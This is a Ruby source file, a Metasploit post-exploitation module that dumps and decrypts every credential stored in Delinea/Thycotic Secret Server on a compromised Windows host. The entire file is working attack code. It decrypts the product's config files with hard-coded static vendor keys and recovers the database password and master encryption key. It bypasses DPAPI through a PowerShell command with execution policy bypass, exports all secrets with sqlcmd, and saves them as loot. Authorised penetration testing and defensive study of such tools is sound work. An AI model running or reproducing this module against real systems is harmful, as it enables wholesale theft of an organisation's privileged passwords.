##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::MSSQL
  include Msf::Post::Windows::Registry

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Delia Thycotic Secret Server Dump',
        'Description' => %q{
          This module exports and decrypts Secret Server credentials to a CSV file;
          it is intended as a post-exploitation module for Windows hosts with Delia/Thycotic
          Secret Server installed. Master Encryption Key (MEK) and associated IV values are
          decrypted from encryption.config using a static key baked into the software. The
          module also supports parameter recovery for encryption configs configured with
          Windows DPAPI. An optional parameter "LOOT_ONLY" allows the encryption keys and
          encrypted database to be plundered for late offline decryption in situations where
          expedience is necessary.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'win' ],
        'DisclosureDate' => '2022-08-15',
        'SessionTypes' => [ 'meterpreter' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/denandz/SecretServerSecretStealer']
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Dump Secret Server'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )

    register_options([
      OptBool.new('LOOT_ONLY', [ false, 'Only loot the encryption keys and database dump for offline decryption', false ])
    ])
  end

  def loot_only
    datastore['LOOT_ONLY']
  end

  def export_header_row
    'SecretID,LastModifiedDate,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemKey,IvMEK,ItemValue,ItemValue2,IV'
  end

  def result_header_row
    'SecretID,LastModifiedDate,Active,SecretType,SecretName,FieldName,Plaintext,Plaintext2'
  end

  def run
    print_status('Validating target ...')
    ss_web_path = get_secretserver_config
    print_status('Decrypt database.config ...')
    init_thycotic_db(ss_web_path)
    print_status('Decrypt encryption.config ...')
    init_thycotic_encryption(ss_web_path)
    print_status('Init SQL client ...')
    init_sql
    csv = dump_thycotic_db
    total_rows = csv.count
    fail_with(Msf::Exploit::Failure::NoTarget, 'No rows in import file CSV dataset') unless total_rows > 0
    print_good("#{total_rows} rows loaded, #{@ss_total_secrets} unique SecretIDs")
    encrypted_data = csv.to_s.delete("\000")
    p = store_loot('ss_enc', 'CSV', rhost, encrypted_data, "#{@ss_db_name}.csv", 'Encrypted Database Dump')
    print_good("Encrypted Secret Server Database Dump: #{p}")
    return if loot_only

    result_rows = decrypt_thycotic_db(csv)
    fail_with(Msf::Exploit::Failure::NoTarget, 'Filed to decrypt CSV dataset') unless result_rows
    total_result_rows = result_rows.count - 1 # Do not count header row
    total_result_secrets = result_rows['SecretID'].uniq.count - 1
    if @ss_processed_rows == @ss_failed_rows || total_result_rows <= 0
      fail_with(Msf::Exploit::Failure::Unknown, 'No rows could be processed')
    elsif @ss_failed_rows > 0
      print_warning("#{@ss_processed_rows} rows processed (#{@ss_failed_rows} rows failed)")
    else
      print_good("#{@ss_processed_rows} rows processed")
    end
    total_records = @ss_decrypted_rows + @ss_plaintext_rows
    print_status("#{total_records} rows recovered: #{@ss_plaintext_rows} plaintext, #{@ss_decrypted_rows} decrypted (#{@ss_blank_rows} blank)")
    decrypted_data = result_rows.to_s.delete("\000")
    print_status("#{total_result_rows} rows written (#{@ss_blank_rows} blank rows withheld)")
    print_good("#{total_result_secrets} unique SecretID records recovered")
    p = store_loot('ss_dec', 'CSV', rhost, decrypted_data, "#{@ss_db_name}.csv", 'Decrypted Database Dump')
    print_good("Decrypted Secret Server Database Dump: #{p}")
  end

  def dump_thycotic_db
    sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"SET NOCOUNT ON;SELECT s.SecretID,s.LastModifiedDate,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV FROM
tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)\" -h-1 -s\",\" -w 65535 -W -I"
    print_status('Dump Secret Server DB ...')
    query_result = cmd_exec(sql_cmd)
    csv = CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::NoTarget, 'Error parsing SQL dataset into CSV format') unless csv
    @ss_total_secrets = csv['SecretID'].uniq.count
    fail_with(Msf::Exploit::Failure::NoTarget, 'SQL query dataset contains no SecretID column values') unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
    csv
  end

  def decrypt_thycotic_db(csv_dataset)
    current_row = 0
    decrypted_rows = 0
    plaintext_rows = 0
    blank_rows = 0
    failed_rows = 0
    result_csv = CSV.parse(result_header_row, headers: :first_row, write_headers: true, return_headers: true)
    print_status('Process Secret Server DB ...')
    csv_dataset.each do |row|
      current_row += 1
      secret_id = row['SecretID']
      if secret_id.nil?
        failed_rows += 1
        print_error("Row #{current_row} missing SecretID column, skipping")
        next
      end
      secret_ciphertext_1 = row['ItemValue']
      secret_ciphertext_2 = row['ItemValue2']
      secret_lastmod = DateTime.parse(row['LastModifiedDate']).to_time.strftime('%m/%d/%y %H:%M:%S').to_s
      secret_active = row['Active'].to_i
      secret_name = [row['SecretName'][2..]].pack('H*')
      secret_type = [row['SecretType'][2..]].pack('H*')
      secret_encrypted = row['IsEncrypted'].to_i
      secret_use256 = row['Use256Key'].to_i
      secret_keyfield_hex = row['ItemKey'][2..]
      secret_iv_hex = row['IV'][2..]
      secret_field = [row['SecretFieldName'][2..]].pack('H*')
      if secret_iv_hex == 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF' # New-style: ItemKey and ItemIV are part of the key blob
        miv_hex = secret_keyfield_hex[4..35]
        key_hex = secret_keyfield_hex[100..]
        iv_hex = secret_ciphertext_1[4..35]
        value_1_hex = secret_ciphertext_1[100..]
      else # Old-style: ItemKey and ItemIV are stored as columns
        miv_hex = row['IvMEK'][2..]
        key_hex = secret_keyfield_hex
        iv_hex = secret_iv_hex
        value_1_hex = secret_ciphertext_1
      end
      value_1 = [value_1_hex].pack('H*')
      miv = [miv_hex].pack('H*')
      key = [key_hex].pack('H*')
      iv = [iv_hex].pack('H*')
      if secret_encrypted == 1
        secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256)
        if secret_plaintext_1.nil?
          vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
          blank_rows += 1
          next
        end
        # TODO: Figure out how ItemValue2 is encrypted; it does not match the structure of ItemValue.
        # For now just return ciphertext if it exists.
        secret_plaintext_2 = secret_ciphertext_2
        if !secret_plaintext_1 || !secret_plaintext_2
          print_error("SecretID #{secret_id} field #{secret_field} failed to decrypt")
          vprint_error(row.to_s)
          failed_rows += 1
          next
        end
        secret_disposition = 'decrypted'
        decrypted_rows += 1
      else
        secret_plaintext_1 = secret_ciphertext_1
        if secret_plaintext_1.nil?
          vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
          blank_rows += 1
          next
        end
        secret_plaintext_2 = secret_ciphertext_2
        secret_disposition = 'plaintext'
        plaintext_rows += 1
      end
      if !secret_plaintext_1.empty? && !secret_plaintext_2.empty?
        result_line = [secret_id.to_s, secret_lastmod.to_s, secret_active.to_s, secret_type.to_s, secret_name.to_s, secret_field.to_s, secret_plaintext_1.to_s, secret_plaintext_2.to_s]
        result_row = CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
        result_csv << result_row
        vprint_status("SecretID #{secret_id} field #{secret_field} ItemValue recovered: #{secret_disposition}")
      else
        vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue empty, excluding")
        blank_rows += 1
      end
    end
    @ss_processed_rows = current_row
    @ss_blank_rows = blank_rows
    @ss_decrypted_rows = decrypted_rows
    @ss_plaintext_rows = plaintext_rows
    @ss_failed_rows = failed_rows
    result_csv
  end

  def get_secretserver_config
    @ss_hostname = get_env('COMPUTERNAME')
    print_status("Hostname #{@ss_hostname} IPv4 #{rhost}")
    reg_key = 'HKLM\\SOFTWARE\\Thycotic\\Secret Server\\'
    fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
    ss_web_path = registry_getvaldata(reg_key, 'WebDir')
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find WebDir registry entry under #{reg_key}") unless ss_web_path
    ss_version_xml_file = ss_web_path + 'Version.xml'
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find #{ss_version_xml_file}") unless file_exist?(ss_version_xml_file)
    version_xml = read_file(ss_version_xml_file)
    xml = Nokogiri::XML(version_xml)
    ss_version_str = xml.at_xpath('//Version/AssemblyVersion').text
    vprint_status("Secret Server Build #{ss_version_str}")
    vprint_status('Secret Server Web Root:')
    vprint_status("\t#{ss_web_path}")
    ss_web_path
  end

  def init_sql
    get_sql_client
    fail_with(Failure::Unknown, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
    print_good("Found SQL client: #{@sql_client}")
  end

  def read_config_file(ss_config_file)
    fail_with(Msf::Exploit::Failure::NoTarget, "#{ss_config_file} not found") unless file_exist?(ss_config_file)
    read_file(ss_config_file)
  end

  def init_thycotic_encryption(ss_web_path)
    ss_enc_config_file = ss_web_path + 'encryption.config'
    enc_conf = thycotic_encryption_config_decrypt(read_config_file(ss_enc_config_file))
    ss_key_hex = enc_conf['KEY']
    ss_key256_hex = enc_conf['KEY256']
    ss_iv_hex = enc_conf['IV']
    if enc_conf['ISENCRYPTEDWITHDPAPI'].to_s.upcase == 'TRUE'
      print_status('DPAPI encryption has been configured for the Master Encryption Key, attempting LocalMachine decryption ...')
      ss_key_hex = dpapi_decrypt(ss_key_hex)
      ss_key256_hex = dpapi_decrypt(ss_key256_hex)
    end
    fail_with(Msf::Exploit::Failure::NoTarget, "Failed to recover Master Encryption Key values from #{ss_enc_config_file}") if ss_key_hex.nil? || ss_key256_hex.nil? || ss_iv_hex.nil?
    @ss_iv = [ss_iv_hex].pack('H*')
    @ss_key = [ss_key_hex].pack('H*')
    @ss_key256 = [ss_key256_hex].pack('H*')
    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 443,
      service_name: 'aes',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @ss_hostname
    }
    store_valid_credential(user: 'KEY', private: ss_key_hex, service_data: extra_service_data)
    store_valid_credential(user: 'KEY256', private: ss_key256_hex, service_data: extra_service_data)
    store_valid_credential(user: 'IV', private: ss_iv_hex, service_data: extra_service_data)
    print_good('Secret Server Encryption Configuration:')
    print_good("\t   KEY: #{ss_key_hex}")
    print_good("\tKEY256: #{ss_key256_hex}")
    print_good("\t    IV: #{ss_iv_hex}")
  end

  def thycotic_encryption_config_decrypt(enc_conf_bytes)
    res = {}
    # Burned-in static keys and IV
    aes_key = ['83fb558645767abb199755eafb4fbc5167113da8ee69f13267388dc3adcdb088'].pack('H*')
    aes_iv = ['ad478c63f93d5201e0a1bbfff0072b6b'].pack('H*')
    xor_key = '8200ab18b1a1965f1759c891e87bc32f208843331d83195c21ee03148b531a0e'.scan(/../).map(&:hex)
    ciphertext_bytes = enc_conf_bytes[41..]
    fail_with(Msf::Exploit::Failure::NoTarget, 'Error decrypting encryption.config') unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv))
    xor_1 = plaintext_conf[1..4].unpack('l*').first
    xor_2 = plaintext_conf[5..8].unpack('l*').first
    num_keys = xor_1 ^ xor_2
    working_offset = 9
    i = 1
    until i > num_keys
      k = nil
      v = nil
      for is_key in [true, false] do
        idx_xor = plaintext_conf[working_offset..working_offset + 3].unpack('l*').first
        idx_len = plaintext_conf[working_offset + 4..working_offset + 7].unpack('l*').first
        len = idx_len ^ idx_xor
        key_xor = plaintext_conf[working_offset + 8..working_offset + 7 + len].unpack('C*')
        plaintext = xor_decrypt(key_xor, xor_key).pack('C*')
        working_offset += len + 8
        if is_key
          k = plaintext.delete("\000")
        else
          v = plaintext.delete("\000")
        end
      end
      if !k
        next
      else
        res[k.upcase] = v
      end

      i += 1
    end
    res
  end

  def init_thycotic_db(ss_web_path)
    ss_db_config_file = ss_web_path + 'database.config'
    db_conf = get_thycotic_database_config(read_config_file(ss_db_config_file))
    db_instance_path = db_conf['DATA SOURCE']
    db_name = db_conf['INITIAL CATALOG']
    db_user = db_conf['USER ID']
    db_pass = db_conf['PASSWORD']
    fail_with(Msf::Exploit::Failure::NoTarget, "Failed to recover database parameters from #{ss_db_config_file}") if db_instance_path.nil? || db_name.nil? || db_user.nil? || db_pass.nil?
    @ss_db_instance_path = db_instance_path
    @ss_db_name = db_name
    @ss_db_user = db_user
    @ss_db_pass = db_pass
    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 1433,
      service_name: 'mssql',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @ss_db_instance_path
    }
    store_valid_credential(user: @ss_db_user, private: @ss_db_pass, service_data: extra_service_data)
    print_good('Secret Server SQL Database Connection Configuration:')
    print_good("\tInstance Name: #{@ss_db_instance_path}")
    print_good("\tDatabase Name: #{@ss_db_name}")
    print_good("\tDatabase User: #{@ss_db_user}")
    print_good("\tDatabase Pass: #{@ss_db_pass}")
  end

  def get_thycotic_database_config(db_conf_bytes)
    res = {}
    # Burned-in static keys and IV
    aes_key = ['020216980119760c0b79017097830b1d'].pack('H*')
    aes_iv = ['7a790a22020b6eb3630cdd080310d40a'].pack('H*')
    fail_with(Msf::Exploit::Failure::NoTarget, 'Error decrypting database.config') unless (plaintext_conf = aes_cbc_decrypt(db_conf_bytes, aes_key, aes_iv).delete("\000"))
    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not extract connectionString from database.config') unless (db_str = get_thycotic_database_string(plaintext_conf))
    db_connection_elements = db_str.split(';')
    db_connection_elements.each do |element|
      pair = element.to_s.split('=')
      k = pair[0]
      v = pair[1]
      res[k.upcase] = v
    end
    res
  end

  def get_thycotic_database_string(plaintext_conf)
    return false unless plaintext_conf.match?(/connectionString/i)

    working_offset = plaintext_conf.index(/connectionString/i) + 18
    byte_len = plaintext_conf.length - working_offset
    working_bytes = plaintext_conf[working_offset, byte_len]
    val_len = working_bytes[0].unpack('H*').first.to_i(16).to_i
    working_bytes[2, val_len]
  end

  def thycotic_secret_decrypt(options = {})
    secret_id = options.fetch(:secret_id)
    secret_field = options.fetch(:secret_field)
    secret_value = options.fetch(:secret_value)
    secret_key = options.fetch(:secret_key)
    secret_iv = options.fetch(:secret_iv)
    secret_miv = options.fetch(:secret_miv)
    secret_use256 = options.fetch(:secret_use256)

    if secret_use256 == 1
      mek = @ss_key256
    else
      mek = @ss_key
    end
    intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
    if intermediate_key
      decrypted_secret = aes_cbc_decrypt(secret_value, intermediate_key, secret_iv)
    else
      vprint_error("SecretID #{secret_id} field #{secret_field} intermediate key decryption failed")
      decrypted_secret = false
    end
    unless decrypted_secret
      vprint_warning("SecretID #{secret_id} field #{secret_field} decryption failed via intermediate key, attempting item key decryption")
      decrypted_secret = aes_cbc_decrypt(secret_value, secret_key, secret_iv)
      return false unless decrypted_secret
    end
    plaintext = decrypted_secret.delete("\000")[4..]
    # Catch where decryption did not throw an exception but produced invalid UTF-8 plaintext
    # This was evident in a few test cases where the secret value appeared to have been pasted from Microsoft Word
    if !plaintext.force_encoding('UTF-8').valid_encoding?
      plaintext = Base64.strict_encode64(decrypted_secret.delete("\000")[4..])
      print_warning("SecretID #{secret_id} field #{secret_field} contains invalid UTF-8 and will be stored as a Base64 string in the output file")
    end
    plaintext
  end

  def xor_decrypt(ciphertext_bytes, xor_key)
    pos = 0
    res = []
    for i in 0..ciphertext_bytes.length - 1 do
      res[i] = ciphertext_bytes[i] ^ xor_key[pos]
      pos += 1
      if pos == xor_key.length
        pos = 0
      end
    end
    res
  end

  def aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv)
    return false unless aes_iv.length == 16

    case aes_key.length
    when 16
      decipher = OpenSSL::Cipher.new('aes-128-cbc')
    when 32
      decipher = OpenSSL::Cipher.new('aes-256-cbc')
    else
      return false
    end
    decipher.decrypt
    decipher.key = aes_key
    decipher.iv = aes_iv
    decipher.padding = 1
    decipher.update(ciphertext_bytes) + decipher.final
  rescue OpenSSL::Cipher::CipherError
    return false
  end

  def dpapi_decrypt(b64)
    cmd_str = "powershell.exe -ep bypass -nop -command \"Add-Type -AssemblyName System.Security;[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'), $Null, 'LocalMachine'))\""
    plaintext = cmd_exec(cmd_str)
    fail_with(Msf::Exploit::Failure::NoTarget, 'Failed DPAPI LocalMachine decryption') unless plaintext.match?(/^[0-9a-f]+$/i)
    plaintext
  end
end
